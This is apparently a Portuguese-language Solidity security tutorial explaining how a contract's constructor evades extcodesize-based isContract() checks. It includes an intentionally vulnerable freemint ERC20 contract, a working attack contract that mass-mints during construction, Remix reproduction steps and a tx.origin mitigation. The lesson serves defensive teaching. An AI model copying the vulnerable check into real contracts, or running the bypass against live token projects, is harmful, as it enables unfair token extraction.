# Segurança do Contrato Solidity: S08. Bypass da Verificação do Contrato

Recentemente, tenho revisado meus conhecimentos em Solidity, reforçando os detalhes e escrevendo um "Guia Simplificado do WTF Solidity" para iniciantes (os programadores experientes podem buscar outros tutoriais). Atualizarei o guia com 1-3 lições por semana.

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy_](https://twitter.com/WTFAcademy_)

Comunidade: [Discord](https://discord.gg/5akcruXrsk) | [Grupo no WeChat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link) | [Site oficial wtf.academy](https://wtf.academy)

Todo o código e tutoriais estão disponíveis no GitHub: [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTF-Solidity)

---

Nesta lição, vamos falar sobre como contornar a verificação do comprimento do contrato e apresentar métodos de prevenção.

## Bypass da Verificação do Contrato

Muitos projetos freemint utilizam a função `isContract()` para limitar a chamada do `msg.sender` a apenas contas externas (EOA), e não a contratos. Essa função usa o método `extcodesize` para obter o comprimento do `bytecode` armazenado no endereço (em tempo de execução). Se esse comprimento for maior do que zero, é considerado um contrato; caso contrário, é uma conta EOA (usuário).

```solidity
    // Verifica se é um contrato usando extcodesize
    function isContract(address account) public view returns (bool) {
        // Um endereço com extcodesize > 0 é considerado um contrato
        // Porém, durante a chamada do construtor do contrato, extcodesize é 0
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
```

No entanto, há uma vulnerabilidade: quando um contrato está sendo criado, o `bytecode` de tempo de execução ainda não foi armazenado no endereço, portanto o comprimento do `bytecode` é 0. Isso significa que se colocarmos a lógica no construtor do contrato, podemos contornar a verificação do `isContract()`.

## Exemplo de Vulnerabilidade

Aqui está um exemplo: o contrato `ContractCheck` é um contrato ERC20 freemint, e a função de mintagem `mint()` utiliza a função `isContract()` para impedir chamadas de contrato a fim de evitar a mintagem em massa por programadores. Cada chamada do `mint()` pode criar 100 tokens.
 
```solidity
// Verifica se é um contrato usando extcodesize
contract ContractCheck is ERC20 {
    // Construtor: inicializa o nome e o símbolo do token
    constructor() ERC20("", "") {}
    
    // Verifica se é um contrato usando extcodesize
    function isContract(address account) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    // Função de mintagem, apenas chamadas de contas não-contratuais são permitidas (com vulnerabilidade)
    function mint() public {
        require(!isContract(msg.sender), "Contrato não permitido!");
        _mint(msg.sender, 100);
    }
}
```

Vamos criar um contrato de ataque que chama repetidamente a função `mint()` do contrato `ContractCheck` no construtor, realizando a mintagem de 1000 tokens em massa: 

```solidity
// Ataque aproveitando as características do construtor
contract NotContract {
    bool public isContract;
    address public contractCheck;

    // Quando o contrato está sendo criado, extcodesize (comprimento do código) é 0, então não será detectado por isContract().
    constructor(address addr) {
        contractCheck = addr;
        isContract = ContractCheck(addr).isContract(address(this));
        // Isso funcionará
        for(uint i; i < 10; i++){
            ContractCheck(addr).mint();
        }
    }

    // Após a criação do contrato, extcodesize > 0, isContract() consegue detectar
    function mint() external {
        ContractCheck(contractCheck).mint();
    }
}
```

Se nossa hipótese estiver correta, chamadas da função `mint()` no construtor podem contornar a verificação do `isContract()` e realizar a mintagem com sucesso, e o estado da variável `isContract` será definido como `false`. Após a criação do contrato, quando o `runtime bytecode` já estiver armazenado, o `extcodesize > 0` e o `isContract()` serão capazes de evitar a mintagem, resultando em falha ao chamar a função `mint()`.

## Reprodução no Remix

1. Deploy do contrato `ContractCheck`.

2. Deploy do contrato `NotContract`, passando o endereço do contrato `ContractCheck` como parâmetro.

3. Use a função `balanceOf` do contrato `ContractCheck` para verificar o saldo de tokens do contrato `NotContract` como `1000`, indicando um ataque bem-sucedido.

4. Chame a função `mint()` do contrato `NotContract`; como o contrato já foi criado, a chamada da função `mint()` irá falhar.

## Medidas Preventivas

Você pode usar `(tx.origin == msg.sender)` para verificar se o chamador é um contrato. Se o chamador for uma EOA, `tx.origin` e `msg.sender` serão iguais; se forem diferentes, o chamador será um contrato.

```solidity
function realContract(address account) public view returns (bool) {
    return (tx.origin == msg.sender);
}
```

## Conclusão

Nesta lição, discutimos como é possível contornar a verificação do comprimento do contrato e apresentamos métodos preventivos. Se o comprimento do `extcodesize` de um endereço for maior que zero, é um contrato; mas se for zero, o endereço pode ser tanto uma EOA quanto um contrato em processo de criação.

<!-- This file was translated using AI by repo_ai_translate. For more information, visit https://github.com/marcelojsilva/repo_ai_translate -->